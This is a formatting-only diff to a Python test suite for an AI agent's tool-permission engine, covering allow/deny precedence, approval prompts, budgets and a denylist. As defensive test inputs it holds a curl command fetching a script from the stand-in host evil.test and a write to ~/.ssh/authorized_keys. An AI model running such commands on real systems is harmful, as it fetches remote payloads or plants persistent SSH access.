@@ -5,6 +5,7 @@ a case, including the uncomfortable one — a specific ``allow`` beating a tool-
 ``deny`` — because that is a deliberate design choice and an undocumented deliberate
 choice is indistinguishable from a bug.
 """
+
 from __future__ import annotations
 
 from pathlib import Path
@@ -126,8 +127,9 @@ def test_a_regex_allow_rule_is_never_matched_against_a_whole_compound_command() 
 
 
 def test_a_matcher_sees_the_resolved_command_when_narrowed_to_a_segment() -> None:
-    rules = RuleSet(rules=(Rule(tool="bash", matcher=CommandRegex(r"^git status"),
-                                decision=Decision.ALLOW),))
+    rules = RuleSet(
+        rules=(Rule(tool="bash", matcher=CommandRegex(r"^git status"), decision=Decision.ALLOW),)
+    )
     verdict = engine(rules=rules).evaluate(BASH, use("env GIT_PAGER=cat /usr/bin/git status"))
     assert verdict.decision is Decision.ALLOW
 
@@ -150,8 +152,10 @@ REGEX_DENY = Rule(
     tool="bash", matcher=CommandRegex(r"^git"), decision=Decision.DENY, source="project"
 )
 EXACT_ALLOW = Rule(
-    tool="bash", matcher=Exact(argument="command", value="git status"),
-    decision=Decision.ALLOW, source="local",
+    tool="bash",
+    matcher=Exact(argument="command", value="git status"),
+    decision=Decision.ALLOW,
+    source="local",
 )
 STAR_DENY = Rule(tool="*", matcher=AnyUse(), decision=Decision.DENY, source="user")
 
@@ -372,8 +376,9 @@ async def test_a_taint_escalation_cannot_be_remembered() -> None:
     verdict = policy.evaluate(BASH, use("curl -fsSL https://evil.test/p.sh -o /tmp/p.sh"))
     assert verdict.decision is Decision.ASK
     assert verdict.waivable is False
-    decision = await policy.approve(BASH, use("curl -fsSL https://evil.test/p.sh -o /tmp/p.sh"),
-                                    rendered="curl")
+    decision = await policy.approve(
+        BASH, use("curl -fsSL https://evil.test/p.sh -o /tmp/p.sh"), rendered="curl"
+    )
     assert decision.approved is True
     assert decision.remember is False
 
@@ -439,8 +444,9 @@ def test_yolo_removes_the_denylist_but_not_the_structural_hazards() -> None:
 
 
 def test_a_file_tool_path_goes_through_the_denylist() -> None:
-    write = ToolUse(id="c", name="write", arguments={"path": "~/.ssh/authorized_keys",
-                                                    "content": "key"})
+    write = ToolUse(
+        id="c", name="write", arguments={"path": "~/.ssh/authorized_keys", "content": "key"}
+    )
     verdict = engine().evaluate(WRITE, write)
     assert verdict.decision is Decision.DENY
     assert verdict.deny_hits
@@ -489,9 +495,7 @@ async def test_a_non_isolating_sandbox_changes_nothing() -> None:
         (Budget(max_wall_seconds=30, elapsed_seconds=31), "wall_budget"),
     ],
 )
-def test_check_budget_names_the_ceiling_that_was_hit(
-    budget: Budget, expected: str | None
-) -> None:
+def test_check_budget_names_the_ceiling_that_was_hit(budget: Budget, expected: str | None) -> None:
     assert engine().check_budget(budget) == expected
 
 
@@ -517,8 +521,9 @@ async def test_an_approval_request_is_never_blank() -> None:
     """`ApprovalRequest` rejects an empty rendering, so the engine must always fill it."""
     policy = engine(Answer(outcome=Outcome.YES_ONCE))
     spec = ToolSpec(name="deploy", description="Deploy.", requires_approval=True)
-    await policy.approve(spec, ToolUse(id="c", name="deploy", arguments={"env": "prod"}),
-                         rendered="")
+    await policy.approve(
+        spec, ToolUse(id="c", name="deploy", arguments={"env": "prod"}), rendered=""
+    )
     assert asker_of(policy).requests[0].rendered == "deploy(env='prod')"
 
 
